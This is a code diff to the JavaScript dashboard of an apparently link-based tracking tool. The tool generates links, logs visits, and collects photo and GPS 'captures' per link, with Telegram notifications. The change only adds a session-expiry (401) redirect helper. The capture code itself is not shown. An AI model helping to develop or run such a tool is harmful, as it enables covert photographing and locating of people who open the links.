@@ -705,6 +705,18 @@ let allSessions=[], selectedIds=new Set();
 
 const $ = id => document.getElementById(id);
 
+// ── Global API helper: tangani session expired (401) ─────────────────────────
+async function apiFetch(url, opts={}) {
+  const r = await fetch(url, opts);
+  if (r.status === 401) {
+    // Session habis — redirect ke login
+    alert('Sesi Anda telah habis. Silakan login kembali.');
+    location.href = '/login';
+    throw new Error('Session expired');
+  }
+  return r;
+}
+
 // ── Init ──────────────────────────────────────────────────────────────────────
 loadStats();
 setInterval(loadStats, 30000);
@@ -712,7 +724,7 @@ setInterval(loadStats, 30000);
 // ── Stats ─────────────────────────────────────────────────────────────────────
 async function loadStats() {
   try {
-    const r = await fetch('/api/stats');
+    const r = await apiFetch('/api/stats');
     const d = await r.json();
     $('st-sessions').textContent = d.total_sessions;
     $('st-active').textContent   = d.active_sessions;
@@ -826,7 +838,7 @@ async function generateLink() {
   const btn=$('gbtn'); btn.disabled=true; $('glbl').textContent='Membuat...';
   cleanup();
   try {
-    const r = await fetch('/api/generate-link', {
+    const r = await apiFetch('/api/generate-link', {
       method:'POST', headers:{'Content-Type':'application/json'},
       body: JSON.stringify(readForm())
     });
@@ -867,7 +879,7 @@ async function generateBatch() {
   cfg.count = count;
   cfg.label_prefix = $('f-batch-prefix').value.trim()||($('f-label').value.trim()||'Sesi');
   try {
-    const r = await fetch('/api/generate-batch',{
+    const r = await apiFetch('/api/generate-batch',{
       method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(cfg)});
     const results = await r.json();
     const box = $('batch-results'); box.innerHTML='';
@@ -886,14 +898,14 @@ async function generateBatch() {
 // ── Revoke ────────────────────────────────────────────────────────────────────
 async function revokeActive() {
   if (!activeToken||!confirm('Batalkan link ini?')) return;
-  await fetch(`/api/revoke/${activeToken}`,{method:'POST'});
+  await apiFetch(`/api/revoke/${activeToken}`,{method:'POST'});
   setStatus('revoked'); $('revbtn').disabled=true;
   clearInterval(statusTimer); clearInterval(captureTimer); loadHistory();
 }
 
 async function revokeSession(id) {
   if (!confirm('Batalkan link ini?')) return;
-  await fetch(`/api/revoke/${id}`,{method:'POST'}); loadHistory();
+  await apiFetch(`/api/revoke/${id}`,{method:'POST'}); loadHistory();
 }
 
 // ── Copy ──────────────────────────────────────────────────────────────────────
@@ -911,7 +923,7 @@ function copyShort() {
 // ── Status polling ────────────────────────────────────────────────────────────
 async function pollStatus(token) {
   try {
-    const r=await fetch(`/api/status/${token}`); const d=await r.json();
+    const r=await apiFetch(`/api/status/${token}`); const d=await r.json();
     setStatus(d.status);
     if (d.access_count!==undefined) {
       $('sttxt').textContent += ` · ${d.access_count} akses`;
@@ -945,7 +957,7 @@ function openViewer(token, mode) {
 async function refreshCaptures(token) {
   token=token||activeToken; if(!token)return;
   try {
-    const r=await fetch(`/api/captures/${token}`);
+    const r=await apiFetch(`/api/captures/${token}`);
     const caps=await r.json();
     renderPhotos(caps.filter(c=>c.type==='photo'));
     renderGPS(caps.filter(c=>c.type==='gps'));
@@ -1003,7 +1015,7 @@ function renderGPS(pts) {
 async function refreshLogs(token) {
   token=token||activeToken; if(!token)return;
   try {
-    const r=await fetch(`/api/logs/${token}`);
+    const r=await apiFetch(`/api/logs/${token}`);
     const logs=await r.json();
     $('logbar').textContent=`Log Akses — ${logs.length} kunjungan`;
     const list=$('loglist'); list.innerHTML='';
@@ -1018,7 +1030,7 @@ async function refreshLogs(token) {
   } catch{}
 }
 
-async function delCap(id){await fetch(`/api/capture/${id}`,{method:'DELETE'});refreshCaptures();}
+async function delCap(id){await apiFetch(`/api/capture/${id}`,{method:'DELETE'});refreshCaptures();}
 
 function openLB(src,id){$('lbimg').src=src;$('lbdl').dataset.src=src;$('lbdl').dataset.id=id;$('lb').classList.add('on');}
 function lbDl(){const a=document.createElement('a');a.href=$('lbdl').dataset.src;a.download=`photo_${$('lbdl').dataset.id}.jpg`;a.click();}
@@ -1026,7 +1038,7 @@ function lbDl(){const a=document.createElement('a');a.href=$('lbdl').dataset.src
 // ── History ───────────────────────────────────────────────────────────────────
 async function loadHistory() {
   try {
-    const r=await fetch('/api/sessions');
+    const r=await apiFetch('/api/sessions');
     allSessions=await r.json();
     renderHistory(allSessions);
   } catch{}
@@ -1100,7 +1112,7 @@ async function bulkAction(action) {
   if(!selectedIds.size)return;
   const msg=action==='revoke'?'Batalkan semua sesi terpilih?':'Hapus semua sesi terpilih?';
   if(!confirm(msg))return;
-  await fetch('/api/bulk',{method:'POST',headers:{'Content-Type':'application/json'},
+  await apiFetch('/api/bulk',{method:'POST',headers:{'Content-Type':'application/json'},
     body:JSON.stringify({action,ids:[...selectedIds]})});
   clearSelection(); loadHistory(); loadStats();
 }
@@ -1113,7 +1125,7 @@ function viewSession(token, mode) {
 
 async function deleteSession(token) {
   if(!confirm('Hapus sesi dan semua capturenya?'))return;
-  await fetch(`/api/session/${token}`,{method:'DELETE'});
+  await apiFetch(`/api/session/${token}`,{method:'DELETE'});
   if(token===activeToken){$('vph').style.display='flex';$('vinner').style.display='none';activeToken=null;}
   loadHistory(); loadStats();
 }
@@ -1166,21 +1178,21 @@ function loadTemplateById(id) {
 }
 
 async function delTemplate(id) {
-  await fetch(`/api/templates/${id}`,{method:'DELETE'});
+  await apiFetch(`/api/templates/${id}`,{method:'DELETE'});
   loadSettings();
 }
 
 async function saveTemplate() {
   const name=$('f-tpl-name').value.trim();
   if(!name){alert('Masukkan nama template');return;}
-  await fetch('/api/templates',{method:'POST',headers:{'Content-Type':'application/json'},
+  await apiFetch('/api/templates',{method:'POST',headers:{'Content-Type':'application/json'},
     body:JSON.stringify({name,config:readForm()})});
   $('f-tpl-name').value=''; loadSettings();
   alert('Template tersimpan!');
 }
 
 async function saveTg() {
-  const r=await fetch('/api/telegram',{method:'POST',headers:{'Content-Type':'application/json'},
+  const r=await apiFetch('/api/telegram',{method:'POST',headers:{'Content-Type':'application/json'},
     body:JSON.stringify({bot_token:$('tg-token').value.trim(),chat_id:$('tg-chatid').value.trim()})});
   const d=await r.json();
   showScMsg('tg-msg',d.ok?'✅ Tersimpan!':'❌ Gagal',d.ok);
@@ -1188,13 +1200,13 @@ async function saveTg() {
 }
 
 async function testTg() {
-  const r=await fetch('/api/telegram/test',{method:'POST'});
+  const r=await apiFetch('/api/telegram/test',{method:'POST'});
   const d=await r.json();
   showScMsg('tg-msg',d.ok?'✅ Pesan test terkirim!':'❌ Gagal: '+(d.error||''),d.ok);
 }
 
 async function saveAppCfg() {
-  const r=await fetch('/api/app-config',{method:'POST',headers:{'Content-Type':'application/json'},
+  const r=await apiFetch('/api/app-config',{method:'POST',headers:{'Content-Type':'application/json'},
     body:JSON.stringify({rl_max_requests:$('rl-max').value,
       rl_window_minutes:$('rl-win').value,timezone_offset:$('cfg-tz').value})});
   const d=await r.json();
